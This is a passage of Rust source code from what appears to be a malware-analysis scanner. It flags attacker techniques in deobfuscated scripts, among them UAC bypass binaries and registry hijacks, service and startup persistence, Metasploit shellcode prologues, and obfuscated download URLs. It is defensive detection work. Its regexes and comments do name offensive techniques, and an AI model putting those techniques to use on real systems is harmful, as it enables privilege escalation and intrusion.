                    .trim_matches(|c: char| c == '"' || c == '\'')
                    .to_string()
            })
            .unwrap_or_default();
        let tool = if caps
            .get(0)
            .map(|m| contains_ascii_case_insensitive(m.as_str(), "winrm"))
            .unwrap_or(false)
        {
            "winrm"
        } else if caps
            .get(0)
            .map(|m| contains_ascii_case_insensitive(m.as_str(), "invoke-wmi"))
            .unwrap_or(false)
        {
            "Invoke-WmiMethod"
        } else {
            "Set-WmiInstance"
        };
        let key = format!("{tool}\0{host}");
        if !seen.insert(key) {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::RemoteExec { tool: tl, target_host: h }
                    if tl == tool && h == &host
            )
        }) {
            continue;
        }
        env.traits.push(crate::traits::Trait::RemoteExec {
            tool: tool.to_string(),
            target_host: host,
        });
    }
}

/// UAC bypass technique. MITRE T1548.002. Detects:
/// - Auto-elevate-binary triggers (fodhelper/eventvwr/sdclt/computer-
///   defaults/wsreset) when paired with an `HKCU\Software\Classes\...\
///   Shell\Open\command` registry hijack (common pattern: write the
///   payload to the registry, then run the auto-elevator which reads
///   the hijacked command from HKCU and runs it elevated).
/// - cmstp /au (silent INF install with admin token)
/// - msconfig /4 (legacy UAC bypass)
fn scan_uac_bypass(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static PATTERNS: Lazy<Vec<(Regex, &str)>> = Lazy::new(|| {
        vec![
            (Regex::new(r"(?i)\bfodhelper(?:\.exe)?\b").unwrap(), "fodhelper"),
            (Regex::new(r"(?i)\beventvwr(?:\.exe)?\b").unwrap(), "eventvwr"),
            (Regex::new(r"(?i)\bsdclt(?:\.exe)?\b").unwrap(), "sdclt"),
            (Regex::new(r"(?i)\bcomputerdefaults(?:\.exe)?\b").unwrap(), "computerdefaults"),
            (Regex::new(r"(?i)\bwsreset(?:\.exe)?\b").unwrap(), "wsreset"),
            (Regex::new(r"(?i)\bcmstp(?:\.exe)?\s+/au\b").unwrap(), "cmstp-au"),
            (Regex::new(r"(?i)\bmsconfig\s+/4\b").unwrap(), "msconfig-4"),
            (Regex::new(r"(?i)HKCU\\Software\\Classes\\(?:ms-settings|Folder|exefile|mscfile)\\Shell\\Open\\command").unwrap(), "classes-shell-open-hijack"),
            (Regex::new(r"(?i)IColorDataProxy|ICMLuaUtil").unwrap(), "com-elevation"),
        ]
    });
    for (re, tech) in PATTERNS.iter() {
        if re.is_match(deobfuscated) {
            if env.traits.iter().any(|t| {
                matches!(
                    t, crate::traits::Trait::UacBypass { technique: tk } if tk == tech
                )
            }) {
                continue;
            }
            env.traits.push(crate::traits::Trait::UacBypass {
                technique: tech.to_string(),
            });
        }
    }
}

/// `sc create` service install — MITRE T1543.003.
fn scan_service_install(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static SC_CREATE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bsc(?:\.exe)?\s+create\s+(\S+)(?:\s+[^\r\n]*?\bbinPath=\s*(?:"([^"]+)"|(\S+)))?"#)
            .expect("sc create re")
    });
    for caps in SC_CREATE_RE.captures_iter(deobfuscated) {
        let name = caps
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        let path = caps
            .get(2)
            .or_else(|| caps.get(3))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::ServiceInstall { service_name: n, .. } if n == &name
            )
        }) {
            continue;
        }
        env.traits.push(crate::traits::Trait::ServiceInstall {
            service_name: name,
            bin_path: path,
        });
    }
}

fn scan_startup_folder_persistence(deobfuscated: &str, env: &mut Environment) {
    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let Some(cmd_base) = basename_trimmed(cmd) else {
            continue;
        };
        if !cmd_base.eq_ignore_ascii_case("move") && !cmd_base.eq_ignore_ascii_case("copy") {
            continue;
        }
        if tokens.len() < 3 {
            continue;
        }
        let src = strip_outer_quotes(&tokens[tokens.len() - 2]);
        let dst = strip_outer_quotes(&tokens[tokens.len() - 1]);
        if !contains_ascii_case_insensitive(
            dst,
            "microsoft\\windows\\start menu\\programs\\startup",
        ) && !contains_ascii_case_insensitive(
            dst,
            "microsoft/windows/start menu/programs/startup",
        ) {
            continue;
        }
        let Some(value_name) = windows_basename(src) else {
            continue;
        };
        let command = join_windows_path(dst, value_name);
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::Persistence {
                    hive,
                    key,
                    value_name: existing_name,
                    command: existing_command,
                } if hive == "StartupFolder"
                    && key.eq_ignore_ascii_case(dst)
                    && existing_name.eq_ignore_ascii_case(value_name)
                    && existing_command.eq_ignore_ascii_case(&command)
            )
        }) {
            continue;
        }
        env.traits.push(Trait::Persistence {
            hive: "StartupFolder".to_string(),
            key: dst.to_string(),
            value_name: value_name.to_string(),
            command,
        });
    }
}

fn join_windows_path(dir: &str, name: &str) -> String {
    let trimmed = dir.trim_end_matches(['\\', '/']);
    if trimmed.is_empty() {
        name.to_string()
    } else {
        format!("{trimmed}\\{name}")
    }
}

/// PowerShell `Start-Sleep -Seconds N` — beacon-style C2 cadence.
fn scan_beacon_sleep(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static SLEEP_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)Start-Sleep\s+(?:-Seconds\s+)?(\d{1,7})"#).expect("start-sleep re")
    });
    let mut seen: std::collections::HashSet<u32> = std::collections::HashSet::new();
    for caps in SLEEP_RE.captures_iter(deobfuscated).take(8) {
        let secs = caps
            .get(1)
            .and_then(|m| m.as_str().parse::<u32>().ok())
            .unwrap_or(0);
        // Trivial 1-3s sleeps are usually retry/init waits, not C2 beacon.
        // Beacon cadences are typically 10s+ (often minutes).
        if secs < 5 || !seen.insert(secs) {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::BeaconSleep { seconds: s } if *s == secs
            )
        }) {
            continue;
        }
        env.traits
            .push(crate::traits::Trait::BeaconSleep { seconds: secs });
    }
}

/// Shellcode marker — `$shellcode = ...`, NOP-sled `0x90,0x90,...`,
/// `\x90\x90` literal, or a `[Byte[]] $var = 0xNN, 0xNN, …` array that
/// starts with one of the well-known x64/x86 Metasploit-family shellcode
/// prologues (`fc 48 83 e4 f0` for x64, `fc e8 …` for x86 GetEIP).
fn scan_shellcode_marker(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static SHELLCODE_VAR_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)\$(\w*shellcode\w*)\s*="#).expect("shellcode var"));
    static NOP_SLED_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?:0x90\s*,\s*){8,}|(?:\\x90){8,}"#).expect("nop sled"));
    // `[Byte[]] $x = 0xfc, 0x48, 0x83, 0xe4, 0xf0` — Metasploit x64
    // reverse_*/meterpreter prologue (`cld; sub rsp, 0xf0`).
    static MSF_X64_PROLOGUE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)\[\s*Byte\s*\[\s*\]\s*\]\s*\$\w+\s*=\s*0xfc\s*,\s*0x48\s*,\s*0x83\s*,\s*0xe4\s*,\s*0xf0"#,
        )
        .expect("msf x64 prologue")
    });
    // `[Byte[]] $x = 0xfc, 0xe8` — Metasploit x86 GetEIP prologue
    // (`cld; call <next>`). 0xe8 alone is too noisy; require the byte-array
    // wrapper to anchor it.
    static MSF_X86_PROLOGUE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\[\s*Byte\s*\[\s*\]\s*\]\s*\$\w+\s*=\s*0xfc\s*,\s*0xe8"#)
            .expect("msf x86 prologue")
    });
    if let Some(m) = SHELLCODE_VAR_RE.find(deobfuscated) {
        let evidence = m.as_str().to_string();
        if !env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::ShellcodeMarker { evidence: e } if e == &evidence
            )
        }) {
            env.traits
                .push(crate::traits::Trait::ShellcodeMarker { evidence });
        }
    }
    if NOP_SLED_RE.find(deobfuscated).is_some()
        && !env.traits.iter().any(|t| matches!(t, crate::traits::Trait::ShellcodeMarker { evidence } if evidence == "nop-sled"))
    {
        env.traits.push(crate::traits::Trait::ShellcodeMarker {
            evidence: "nop-sled".to_string(),
        });
    }
    for (re, label) in &[
        (&*MSF_X64_PROLOGUE_RE, "msf-x64-prologue"),
        (&*MSF_X86_PROLOGUE_RE, "msf-x86-prologue"),
    ] {
        if re.find(deobfuscated).is_some()
            && !env.traits.iter().any(|t| {
                matches!(
                    t, crate::traits::Trait::ShellcodeMarker { evidence } if evidence == label
                )
            })
        {
            env.traits.push(crate::traits::Trait::ShellcodeMarker {
                evidence: (*label).to_string(),
            });
        }
    }
}

pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
    scan_self_elevation(deobfuscated, env);
    scan_defender_evasion(deobfuscated, env);
    scan_inmem_assembly_load(deobfuscated, env);
    scan_lateral_movement(deobfuscated, env);
    scan_anti_recovery(deobfuscated, env);
    scan_network_probe(deobfuscated, env);
    scan_enumeration(deobfuscated, env);
    scan_credential_access(deobfuscated, env);
    scan_process_injection(deobfuscated, env);
    scan_input_capture(deobfuscated, env);
    scan_ransom_ext(deobfuscated, env);
    scan_remote_exec(deobfuscated, env);
    scan_uac_bypass(deobfuscated, env);
    scan_service_install(deobfuscated, env);
    scan_startup_folder_persistence(deobfuscated, env);
    scan_beacon_sleep(deobfuscated, env);
    scan_shellcode_marker(deobfuscated, env);
    scan_bitsadmin_deob_text(deobfuscated, env);
    scan_python_requests_get_deob_text(deobfuscated, env);
    scan_typo_webclient_downloads(deobfuscated, env);
    scan_url_launch_deob_text(deobfuscated, env);
    scan_process_url_arguments(deobfuscated, env);
    scan_url_variable_assignments(deobfuscated, env);
    scan_registry_url_values(deobfuscated, env);
    scan_echoed_vbs_xmlhttp_deob_text(deobfuscated, env);
    scan_copied_curl_alias_deob_text(deobfuscated, env);
    scan_copied_cleanup_alias_deob_text(deobfuscated, env);
    scan_copied_net_alias_deob_text(deobfuscated, env);
    scan_curl_style_compact_flags_deob_text(deobfuscated, env);
    scan_echoed_curl_deob_text(deobfuscated, env);
    scan_curl_redirect_deob_text(deobfuscated, env);
    scan_curl_deob_text(deobfuscated, env);
    scan_wget_deob_text(deobfuscated, env);
    scan_certutil_urlcache_deob_text(deobfuscated, env);
    scan_damaged_scheme_download_urls(deobfuscated, env);
    scan_ps_replace_chain_urls(deobfuscated, env);
    scan_ps_bare_url_downloads(deobfuscated, env);
    scan_ps_char_index_extractor_urls(deobfuscated, env);
    scan_js_fromcharcode_urls(deobfuscated, env);
    scan_js_unescape_urls(deobfuscated, env);
    scan_js_atob_urls(deobfuscated, env);
    scan_extrac32_self_extract(deobfuscated, env);
    scan_ps_var_socket_connect(deobfuscated, env);
    scan_resolved_deob_var_fragment_urls(deobfuscated, env);
    scan_rot13_urls_in_deob_text(deobfuscated, env);

    // Build a set of URLs already known
    let known = env.known_extracted_urls();

    // Sweep
    let mut seen_new: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in URL_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let mut url = trim_url_suffix(m.as_str()).to_string();
        if url.len() < 8 {
            continue;
        } // http://x is the minimum sensible URL
        if let Some(normalized) = normalize_liberal_url_token(&url) {
            url = normalized;
        }
        if is_noise_url(&url) {
            continue;
        }
        if is_known_or_known_query_prefix(&known, &url) {
            continue;
        }
        if !seen_new.insert(url.clone()) {
            continue;
        }

        // Best-effort: find the line containing this URL for context
        let line_hint = deobfuscated
            .lines()
            .find(|l| l.contains(&url))
            .map(|l| snippet_prefix(l, 200))
            .unwrap_or_default();
        if is_noise_url_context(&line_hint, &url) {
            continue;
        }

        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint,
        });
    }
}

fn scan_rot13_urls_in_deob_text(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen_new: std::collections::HashSet<String> = std::collections::HashSet::new();

    for caps in ROT13_URL_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let encoded = trim_url_suffix(m.as_str());
        if encoded.len() < "uggc://k".len() {
            continue;
        }

        let decoded = rot13_ascii(encoded);
        let Some(url) = normalize_liberal_url_token(&decoded) else {
            continue;
        };
        if !(url.starts_with("http://")
            || url.starts_with("https://")
            || url.starts_with("ftp://")
            || url.starts_with("file://"))
        {
            continue;
        }
        if is_noise_url(&url) {
            continue;
        }
        if is_known_or_known_query_prefix(&known, &url) {
            continue;
        }
        if !seen_new.insert(url.clone()) {
            continue;
        }

        let line_hint = deobfuscated
            .lines()
            .find(|line| line.contains(encoded) || line.contains(&url))
            .map(|line| snippet_prefix(line, 200))
            .unwrap_or_default();
        if is_noise_url_context(&line_hint, &url) {
            continue;
        }

        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint,
        });
    }
}

fn rot13_ascii(text: &str) -> String {
    text.bytes()
        .map(|byte| match byte {
            b'a'..=b'z' => (((byte - b'a' + 13) % 26) + b'a') as char,
            b'A'..=b'Z' => (((byte - b'A' + 13) % 26) + b'A') as char,
            _ => byte as char,
        })
        .collect()
}

fn scan_resolved_deob_var_fragment_urls(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut scratch = env.clone();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut candidates = 0usize;
    for line in deobfuscated.lines() {
        crate::handlers::set::h_set(line, &mut scratch);
        if candidates >= 32 {
            break;
        }
        if line.len() > 16 * 1024 {
            continue;
        }
        if !line.contains('%') || !line.contains("://") || !line.contains(":~") {
            continue;
        }
        candidates += 1;
        let mut expanded_inputs = Vec::new();
        let expanded = crate::normalize::normalize_to_string(&crate::lex::lex(line), &mut scratch);
        if expanded != line && expanded.contains("://") {
            expanded_inputs.push(expanded);
        }
        collect_resolved_quoted_var_fragment_inputs(line, &mut scratch, &mut expanded_inputs);
        collect_resolved_var_fragment_url_inputs(line, &mut scratch, &mut expanded_inputs);

        for expanded in expanded_inputs {
            for caps in URL_RE.captures_iter(&expanded) {
                let Some(m) = caps.get(1) else { continue };
                let url = trim_url_suffix(m.as_str());
                if url.len() < 8 {
                    continue;
                }
                let url = normalize_liberal_url_token(url).unwrap_or_else(|| url.to_string());
                if is_noise_url(&url)
                    || is_known_or_known_query_prefix(&known, &url)
                    || !seen.insert(url.clone())
                {
                    continue;
                }
                env.traits.push(Trait::DownloadInDeobText {
                    src: url,
                    line_hint: "resolved-deob-var-fragments".to_string(),
                });
            }
        }
    }
}

fn collect_resolved_quoted_var_fragment_inputs(
    line: &str,
    env: &mut Environment,
    out: &mut Vec<String>,
) {
    let mut quote_start: Option<(usize, char)> = None;
    for (idx, ch) in line.char_indices() {
        match quote_start {
            Some((start, quote)) if ch == quote => {
                let segment = &line[start + quote.len_utf8()..idx];
                if segment.len() <= 8192
                    && segment.contains('%')
                    && segment.contains("://")
                    && segment.contains(":~")
                {
                    let expanded =
                        crate::normalize::normalize_to_string(&crate::lex::lex(segment), env);
                    if expanded != segment && expanded.contains("://") {
                        out.push(expanded);
                    }
                }
                quote_start = None;
            }
            None if ch == '\'' || ch == '"' => {
                quote_start = Some((idx, ch));
            }
            _ => {}
        }
    }
}

fn collect_resolved_var_fragment_url_inputs(
    line: &str,
    env: &mut Environment,
    out: &mut Vec<String>,
) {
    let mut search_start = 0usize;
    while let Some(rel_marker) = line[search_start..].find("://") {
        let marker = search_start + rel_marker;
        let start = line[..marker]
            .char_indices()
            .rev()
            .find_map(|(idx, ch)| {
                if is_var_fragment_url_boundary(ch) {
                    Some(idx + ch.len_utf8())
                } else {
                    None
                }
            })
            .unwrap_or(0);
        let after_marker = marker + "://".len();
        let end = line[after_marker..]
            .char_indices()
            .find_map(|(rel_idx, ch)| {
                if is_var_fragment_url_boundary(ch) {
                    Some(after_marker + rel_idx)
                } else {
                    None
                }
            })
            .unwrap_or(line.len());
        let segment = &line[start..end];
        if segment.len() <= 8192
            && segment.contains('%')
            && segment.contains("://")
            && segment.contains(":~")
        {
            let expanded = crate::normalize::normalize_to_string(&crate::lex::lex(segment), env);
            if expanded != segment && expanded.contains("://") {
                out.push(expanded);
            }
        }
        search_start = after_marker;
    }
}

fn is_var_fragment_url_boundary(ch: char) -> bool {
    ch.is_whitespace() || matches!(ch, '"' | '\'' | '(' | ')' | '[' | ']' | '{' | '}' | ';')
}

pub fn scan_raw_marker_powershell_urls(input: &[u8], env: &mut Environment) {
    let text = String::from_utf8_lossy(input);
    if !text.contains("%!") {
        return;
    }
    let mut normalized = text.replace('^', "");
    normalized = normalized
        .replace("%!A%", "E")
        .replace("%!a%", "e")
        .replace("%A%", "E")
        .replace("%a%", "e");
    if !contains_ascii_case_insensitive(&normalized, "powershell")
        || !(contains_ascii_case_insensitive(&normalized, "download")
            || contains_ascii_case_insensitive(&normalized, "adstring")
            || contains_ascii_case_insensitive(&normalized, "webclient"))
    {
        return;
    }

    let known = env.known_extracted_urls();
    let mut seen = std::collections::HashSet::new();
    for line in normalized.lines() {
        if !contains_ascii_case_insensitive(line, "powershell")
            && !contains_ascii_case_insensitive(line, "download")
            && !contains_ascii_case_insensitive(line, "adstring")
        {
            continue;
        }
        for caps in URL_RE.captures_iter(line) {
            let Some(m) = caps.get(1) else { continue };
            let url = trim_url_suffix(m.as_str());
            if url.len() < 10 || url.len() > 2048 {
                continue;
            }
            if is_noise_url(url) || known.contains(url) || !seen.insert(url.to_string()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url.to_string(),
                line_hint: "raw-marker-powershell".to_string(),
            });
        }
    }
}

pub fn scan_embedded_powershell_invocations(text: &str, env: &mut Environment) {
    let normalized = text.replace('^', "");
    for line in normalized.lines() {
        for m in EMBEDDED_POWERSHELL_RE.find_iter(line) {
            let tail = &line[m.start()..];
            if !looks_like_embedded_powershell_payload(tail) {
                continue;
            }
            crate::handlers::powershell::h_powershell(tail, env);
        }
    }
    dedup_exec_ps1(env);
}

fn looks_like_embedded_powershell_payload(tail: &str) -> bool {
    // Structural signal — a flag shorthand or download-verb at command
    // position. Substring `contains("downloadstring")` style checks miss
    // any sample that splits the keyword via backtick or variable
    // indirection (`Down`+`loadString`, `Invoke-Web``Request`, etc.).
    if PS_SHORTHAND_GATE_RE.is_match(tail) {
        return true;
    }
    if PS_DOWNLOAD_VERB_RE.is_match(tail) {
        return true;
    }
    // Permissive fallbacks for cases where the gate above misses but the
    // tail still clearly contains a payload signal.
    contains_ascii_case_insensitive(tail, "frombase64string")
        || contains_ascii_case_insensitive(tail, "http://")
        || contains_ascii_case_insensitive(tail, "https://")
}

/// Matches PS download-verb tokens (alias or full cmdlet) at command
/// position. Mirrors what canonical_ps_flag would resolve at the handler
/// level but at the gate level — once we see this we know the line is a
/// payload candidate worth handing to h_powershell.
#[allow(clippy::expect_used)]
static PS_DOWNLOAD_VERB_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)(?:^|[\s;|&(])(?:invoke-webrequest|invoke-restmethod|iwr|irm|wget|curl|downloadstring|downloadfile|downloaddata|start-bitstransfer|new-object\s+net\.webclient)\b",
    )
    .expect("ps download verb regex")
});

/// Matches any powershell.exe shorthand for `-Command` or `-EncodedCommand`,
/// in either dash or forward-slash form. Mirrors the shorthand resolution in
/// `handlers/powershell.rs::canonical_ps_flag` at the gate level: prefix
/// abbreviations (`-Enc`, `-Encoded`, `-Co`) plus the CamelCase initials
/// (`-Ec`) that PS accepts as unambiguous parameter binding.
#[allow(clippy::expect_used)]
static PS_SHORTHAND_GATE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)(?:^|[\s;|&])[-/](?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand|c|co|com|comm|comma|comman|command|f|fi|fil|file)\b",
    )
    .expect("ps shorthand gate")
});

fn dedup_exec_ps1(env: &mut Environment) {
    let mut seen: std::collections::HashSet<Vec<u8>> = std::collections::HashSet::new();
    env.exec_ps1.retain(|payload| seen.insert(payload.clone()));
}

/// Match any run of base64 chars whose prefix decodes to "http" (`aHR0c`),
/// "https" (`aHR0cHM`), "ftp" (`ZnRwOi8v`), or "file:" (`ZmlsZTo`).
/// The prefix anchor stops the
/// regex from firing on random b64 noise; the {16,500} suffix keeps the
/// runtime cost bounded.
#[allow(clippy::expect_used)]
static B64_URL_PREFIX_RE: Lazy<Regex> = Lazy::new(|| {
    // UTF-8 ASCII variant: http(s)/ftp/file directly base64-encoded.
    //   `aHR0cDov…` (http://…)
    //   `aHR0cHM6Ly…` (https://…)
    //   `ZnRwOi8v…` (ftp://…)
    //   `ZmlsZTo…` (file://…)
    // UTF-16LE variant (common in PowerShell `[Convert]::ToBase64String(
    //   [Text.Encoding]::Unicode.GetBytes(...))`):
    //   `aAB0AHQAcAA…` (UTF-16LE "http")
    //   `aAB0AHQAcABzA…` (UTF-16LE "https")
    //   `ZgB0AHAA…` (UTF-16LE "ftp")
    //   `ZgBpAGwAZQA6AA…` (UTF-16LE "file:")
    Regex::new(r"(aHR0[cd][DH]|ZnRwOi8v|ZmlsZTo|aAB0AHQAcAA|aAB0AHQAcABzA|ZgB0AHAA|ZgBpAGwAZQA6AA)[A-Za-z0-9+/=]{16,500}")
        .expect("b64 url prefix regex")
});

#[allow(clippy::expect_used)]
static DAMAGED_SCHEME_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[^A-Za-z])([A-Za-z0-9_%!$:~,\-]{0,80})://([A-Za-z0-9][A-Za-z0-9.\-]{2,}\.[A-Za-z]{2,}(?::\d+)?(?:/[^\s"'<>)]*)?)"#,
    )
    .expect("damaged scheme URL regex")
});

pub fn scan_damaged_scheme_download_urls(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for line in deobfuscated.lines() {
        for caps in DAMAGED_SCHEME_URL_RE.captures_iter(line) {
            let Some(prefix) = caps.get(1) else { continue };
            if starts_with_ascii_case_insensitive(prefix.as_str(), "http")
                || starts_with_ascii_case_insensitive(prefix.as_str(), "https")
                || starts_with_ascii_case_insensitive(prefix.as_str(), "ftp")
            {
                continue;
            }
            let Some(host_path) = caps.get(2) else {
                continue;
            };
            if !is_download_context_line(line)
                && !is_high_confidence_damaged_download_url(
                    prefix.as_str(),
                    host_path.as_str(),
                    line,
                )
            {
                continue;
            }
            let url = format!("https://{}", host_path.as_str());
            let url = trim_url_suffix(&url);
            if url.len() < 10 || url.len() > 2048 {
                continue;
            }
            if is_noise_url(url) || known.contains(url) || !seen.insert(url.to_string()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url.to_string(),
                line_hint: "damaged-scheme-download-context".to_string(),
            });
        }
    }
}

fn is_high_confidence_damaged_download_url(prefix: &str, host_path: &str, line: &str) -> bool {
    let has_cmd_substring_artifact = contains_ascii_case_insensitive(prefix, ":~")
        || prefix.contains('%')
        || prefix.contains('!')
        || contains_ascii_case_insensitive(line, ":~");
    if !has_cmd_substring_artifact {
        return false;
    }

    if starts_with_ascii_case_insensitive(host_path, "gitlab.com/")
        && contains_ascii_case_insensitive(host_path, "/-/raw/")
    {
        return true;
    }
    if starts_with_ascii_case_insensitive(host_path, "raw.githubusercontent.com/") {
        return true;
    }
    if starts_with_ascii_case_insensitive(host_path, "github.com/")
        && contains_ascii_case_insensitive(host_path, "/raw/")
    {
        return true;
    }
    if starts_with_ascii_case_insensitive(host_path, "www.dropbox.com/")
        || starts_with_ascii_case_insensitive(host_path, "dropbox.com/")
        || starts_with_ascii_case_insensitive(host_path, "dl.dropboxusercontent.com/")
    {
        return true;
    }

    contains_ascii_case_insensitive(line, "url")
        && host_path
            .split(['?', '#'])
            .next()
            .is_some_and(has_payload_file_extension)
}

fn has_payload_file_extension(path: &str) -> bool {
    const PAYLOAD_EXTENSIONS: &[&str] = &[
        ".7z", ".apk", ".appx", ".au3", ".bat", ".cab", ".chm", ".cmd", ".com", ".cpl", ".dll",
        ".doc", ".docm", ".docx", ".drv", ".elf", ".exe", ".hta", ".img", ".inf", ".iso", ".jar",
        ".js", ".jse", ".lnk", ".msi", ".msp", ".msix", ".msc", ".ocx", ".one", ".pdf", ".pl",
        ".ps1", ".psm1", ".ppt", ".pptm", ".pptx", ".py", ".pyw", ".rar", ".reg", ".rtf", ".sct",
        ".scr", ".sh", ".so", ".sys", ".url", ".vbs", ".vhd", ".vhdx", ".wsf", ".wsh", ".xlam",
        ".xls", ".xlsm", ".xlsx", ".xll", ".zip",
    ];
    PAYLOAD_EXTENSIONS.iter().any(|ext| path.ends_with(ext))
}

fn is_download_context_line(line: &str) -> bool {
    contains_ascii_case_insensitive(line, "downloadfile")
        || contains_ascii_case_insensitive(line, "downloadstring")
        || contains_ascii_case_insensitive(line, "downloaddata")
        || contains_ascii_case_insensitive(line, "invoke-webrequest")
        || contains_ascii_case_insensitive(line, "invoke-restmethod")
        || contains_ascii_case_insensitive(line, "new-object net.webclient")
        || contains_ascii_case_insensitive(line, "bitsadmin")
        || contains_ascii_case_insensitive(line, "urlcache")
        || contains_ascii_case_insensitive(line, "curl ")
        || contains_ascii_case_insensitive(line, "curl.exe")
        || contains_ascii_case_insensitive(line, "wget ")
        || contains_ascii_case_insensitive(line, "iwr ")
        || contains_ascii_case_insensitive(line, "irm ")
        || (contains_ascii_case_insensitive(line, "://")
            && (contains_ascii_case_insensitive(line, "', '")
                || contains_ascii_case_insensitive(line, "\", \"")
                || contains_ascii_case_insensitive(line, "', \"")
                || contains_ascii_case_insensitive(line, "\", '")))
}

/// Scan for free-floating `aHR0c…` (base64 `http`/`ftp`/`file`) tokens that the
/// existing inline/quoted scanners miss because the b64 isn't passed
/// directly to `FromBase64String` or wrapped in its own quotes — e.g.
/// `set "encoded_url=aHR0c…"` (b64 is part of the quoted value, not the
/// whole value) or `$x = "prefix"+"aHR0c…"+"suffix"`.
pub fn scan_b64_url_prefix(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for m in B64_URL_PREFIX_RE.find_iter(deobfuscated) {
        if m.start() > 0 && is_base64_byte(deobfuscated.as_bytes()[m.start() - 1]) {
            continue;
        }
        if m.end() < deobfuscated.len() && is_base64_byte(deobfuscated.as_bytes()[m.end()]) {
            continue;
        }
        let mut b64 = m.as_str().to_string();
        // Trim to a 4-multiple length for stricter decoder (we don't pad
        // since stray garbage after the b64 would otherwise still decode
        // and yield junk after the URL).
        while b64.len() % 4 != 0 {
            b64.pop();
        }
        if b64.len() < 16 {
            continue;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(&b64) else {
            continue;
        };
        // UTF-16LE bytes look like ASCII chars interleaved with NULs
        // (`h\x00t\x00t\x00…`). Strip those NULs before character-class
        // filtering so UTF-16LE-encoded URLs render correctly.
        let normalized: Vec<u8> = if decoded.len() >= 4 && decoded[1] == 0 && decoded[3] == 0 {
            decoded.iter().step_by(2).copied().collect()
        } else {
            decoded.clone()
        };
        // The decoded text usually has a clean URL up to the first
        // control byte / whitespace / quote; trim there. We treat
        // SPACE, TAB, NUL, `"`, `'`, `<`, `>` as URL terminators so a
        // longer payload doesn't carry trailing arguments into the
        // extracted src field (which then misses our `known` dedup).
        let mut text = String::new();
        for &b in normalized.iter() {
            if !(0x21..=0x7e).contains(&b) {
                break;
            }
            if matches!(b, b'"' | b'\'' | b'<' | b'>') {
                break;
            }
            text.push(b as char);
        }
        if !(text.starts_with("http://")
            || text.starts_with("https://")
            || text.starts_with("ftp://")
            || text.starts_with("file://"))
        {
            continue;
        }
        let text = trim_url_suffix(&text);
        if text.len() < 10 || text.len() > 2048 {
            continue;
        }
        if is_noise_url(text) {
            continue;
        }
        if known.contains(text) {
            continue;
        }
        if !seen.insert(text.to_string()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: "b64-url-prefix".to_string(),
            src: text.to_string(),
            dst: None,
        });
    }
}

fn is_base64_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/')
}

/// Match a single PowerShell `[char[]]@(N,N,...)-join''` chunk.
#[allow(clippy::expect_used)]
static PS_CHAR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"\(\[(?:char\[\]|\[\])\]@\(([\d,\s]+)\)\s*-join\s*'{1,2}\)")
        .expect("ps char concat regex")
});

/// Scan PowerShell `[char[]]@(N,N,...)-join''` chains: concatenate
/// adjacent decoded chunks and look for resulting URLs. Many samples
/// hide their C2 URL across 10-20 small char-array chunks joined by
/// PowerShell `+` operators; the existing URL scanners can't see
/// through the unconcatenated source.
pub fn scan_ps_char_concat_urls(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    // Walk the text; whenever we see a chunk, decode it and append it
    // to a buffer if it's separated from the previous chunk only by
    // whitespace and `+` operators. On break-of-chain (non-trivial
    // text between), flush the buffer and check for a URL.
    let mut buf = String::new();
    let mut prev_end = 0usize;
    for m in PS_CHAR_CONCAT_RE.captures_iter(deobfuscated) {
        let Some(outer) = m.get(0) else { continue };
        let Some(nums) = m.get(1) else { continue };
        // If the gap between prev_end and this match is just `+` / spaces,
        // continue the chain. Otherwise flush + reset.
